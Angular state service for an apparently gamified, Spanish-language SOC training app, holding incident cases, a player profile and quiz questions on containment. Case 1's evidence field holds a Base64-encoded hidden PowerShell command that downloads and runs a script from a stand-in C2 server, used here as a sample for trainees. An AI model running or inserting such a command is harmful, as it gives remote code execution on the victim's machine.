import { Injectable } from '@angular/core';
import { BehaviorSubject } from 'rxjs';
import { Expediente, AgentePerfil, LogSistema } from '../models/cyber.model';

@Injectable({
  providedIn: 'root'
})
export class CyberStateService {
  private perfilSubject = new BehaviorSubject<AgentePerfil>({
    nombre: 'Agente Táctico [SEC-01]',
    rango: 'Analista SOC Tier 1',
    xp: 120,
    nivelProgreso: 35,
    insignias: [
      { id: 'phishing', nombre: 'Anti-Phishing', icono: '🛡️', descripcion: 'Neutralización de vectores de suplantación', desbloqueada: true },
      { id: 'malware', nombre: 'DFIR Operativo', icono: '🔬', descripcion: 'Descompilación de cargas maliciosas', desbloqueada: false },
      { id: 'ransomware', nombre: 'Cripto-Analista', icono: '🔐', descripcion: 'Contención de cifrado hostil', desbloqueada: false },
      { id: 'mitm', nombre: 'Red Interceptor', icono: '📡', descripcion: 'Análisis de tráfico malicioso en red', desbloqueada: false }
    ]
  });

  private expedientesSubject = new BehaviorSubject<Expediente[]>([
    {
      id: 'caso-1',
      numero: 'INC-2026-001',
      titulo: 'Infiltración APT por Payload Ofuscado en PowerShell',
      categoria: 'malware',
      dificultad: 'CRÍTICO',
      cvssScore: 9.8,
      vectorCvss: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H',
      resumen: 'Se detectó ejecución remota anómala codificada en Base64 invocando un script de infraestructura C2 externa.',
      evidencias: [
        {
          id: 'ev-1',
          titulo: 'Fragmento de Registro de Eventos (Sysmon ID 1)',
          contenido: 'powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYzItc2VydmVyLnh5ei9wYXlsb2FkLnBzMScp',
          pistaExplicativa: 'Decodifica el string Base64 para revelar la URL del servidor de Comando y Control (C2).'
        }
      ],
      preguntaFinal: {
        enunciado: '¿Cuál es la acción táctica inmediata recomendada para contener este vector de ejecución?',
        opciones: [
          { id: 'op-1', texto: 'Aislar el host afectado de la red corporativa y revocar tokens de acceso del usuario.', esCorrecta: true, explicacion: 'Correcto. El aislamiento inmediato previene el movimiento lateral del APT.' },
          { id: 'op-2', texto: 'Reiniciar el servicio de Windows Update y borrar archivos temporales.', esCorrecta: false, explicacion: 'Incorrecto. Esto no mitiga la persistencia en memoria.' },
          { id: 'op-3', texto: 'Esperar un reporte detallado del proveedor de antivirus antes de actuar.', esCorrecta: false, explicacion: 'Incorrecto. La latencia operativa permite al atacante exfiltrar datos.' }
        ]
      },
      xpRecompensa: 350,
      completado: false
    },
    {
      id: 'caso-2',
      numero: 'INC-2026-002',
      titulo: 'Ataque de Intercepción de Credenciales (MitM ARP Spoofing)',
      categoria: 'mitm',
      dificultad: 'ALTO',
      cvssScore: 8.4,
      vectorCvss: 'CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N',
      resumen: 'Anomalía detectada en el switch principal del segmento financiero con duplicidad de direcciones MAC.',
      evidencias: [
        {
          id: 'ev-2',
          titulo: 'Captura de Tráfico Wireshark (ARP Table Anomaly)',
          contenido: '192.168.1.1 is-at 50:33:44:55:66:77 (Expected: 00:11:22:33:44:55)\nProtocol: ARP Reply (Gratuitous)',
          pistaExplicativa: 'Una dirección IP corporativa crítica está siendo suplantada.'
        }
      ],
      preguntaFinal: {
        enunciado: '¿Qué contramedida de capa de enlace debe aplicarse de forma permanente?',
        opciones: [
          { id: 'op-1', texto: 'Implementar Dynamic ARP Inspection (DAI) y habilitar Port Security.', esCorrecta: true, explicacion: 'Correcto. DAI valida las solicitudes ARP contra bases de datos fiables.' },
          { id: 'op-2', texto: 'Cambiar la contraseña del enrutador Wi-Fi principal.', esCorrecta: false, explicacion: 'Incorrecto. El problema ocurre en infraestructura cableada interna.' },
          { id: 'op-3', texto: 'Aumentar el ancho de banda del canal corporativo.', esCorrecta: false, explicacion: 'Incorrecto. No guarda relación con ataques de suplantación.' }
        ]
      },
      xpRecompensa: 300,
      completado: false
    }
  ]);

  private logsSubject = new BehaviorSubject<LogSistema[]>([
    { timestamp: '09:12:00', tipo: 'INFO', mensaje: 'Subsistema de enrutamiento y estado inicializado.' }
  ]);

  perfil$ = this.perfilSubject.asObservable();
  expedientes$ = this.expedientesSubject.asObservable();
  logs$ = this.logsSubject.asObservable();

  constructor() {}

  agregarLog(tipo: 'INFO' | 'SUCCESS' | 'ERROR' | 'ALERT_RED', mensaje: string) {
    const now = new Date();
    const timestamp = now.toTimeString().split(' ')[0];
    const actual = this.logsSubject.value;
    this.logsSubject.next([{ timestamp, tipo, mensaje }, ...actual.slice(0, 20)]);
  }

  getExpedientePorId(id: string): Expediente | undefined {
    return this.expedientesSubject.value.find(e => e.id === id);
  }

  completarCaso(id: string) {
    const actual = this.expedientesSubject.value.map(exp => {
      if (exp.id === id) {
        return { ...exp, completado: true };
      }
      return exp;
    });
    this.expedientesSubject.next(actual);
  }

  otorgarXpYDesbloquearInsignia(xpGanado: number, categoria: string) {
    const perfilActual = this.perfilSubject.value;
    let nuevoXp = perfilActual.xp + xpGanado;
    let nuevoRango = perfilActual.rango;
    let progreso = Math.min(100, Math.round((nuevoXp / 1000) * 100));

    if (nuevoXp >= 1000) nuevoRango = 'Director de Ciberinteligencia';
    else if (nuevoXp >= 600) nuevoRango = 'Threat Hunter';
    else if (nuevoXp >= 300) nuevoRango = 'Responder de Incidentes DFIR';

    const insigniasActualizadas = perfilActual.insignias.map(badge => {
      if (badge.id === categoria) {
        return { ...badge, desbloqueada: true };
      }
      return badge;
    });

    this.perfilSubject.next({
      ...perfilActual,
      xp: nuevoXp,
      rango: nuevoRango,
      nivelProgreso: progreso,
      insignias: insigniasActualizadas
    });
  }

  getEstadisticasGlobales() {
    const expedientes = this.expedientesSubject.value;
    const total = expedientes.length;
    const completados = expedientes.filter(e => e.completado).length;
    const porcentaje = total > 0 ? Math.round((completados / total) * 100) : 0;
    return { total, completados, porcentaje };
  }
}